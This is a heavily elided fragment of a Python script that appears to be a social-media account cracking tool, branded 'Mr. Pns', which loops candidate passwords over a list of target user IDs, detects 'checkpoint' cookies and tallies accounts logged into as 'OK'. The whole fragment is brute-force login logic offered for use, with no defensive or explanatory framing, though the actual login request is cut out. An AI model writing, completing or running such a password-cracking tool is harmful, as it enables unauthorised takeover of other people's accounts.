...
def menu(my_name,my_id):
	...
	print(x+'['+h+'•'+x+'] USER ID  TUMBAL   : '+str(my_id))
...
def crack(idf,pwv):
	...
	ses = requests.Session()
	sys.stdout.write('\r%s Mr. Pns %s/%s Mr. Pns OK:%s Mr. Pns CP:%s Mr. Pns %s%s%s Mr.Pns '%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					cetak(nel(statuscp1, title='MR-PNS CP'))
				...
				if 'no' in taplikasi:
					...
					cetak(nel(statusok1, title='MR-PNS OK'))
					ok+=1
					break
					...
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='[bold green]MR-PNS OK[/bold green]'))
					ok+=1
					break
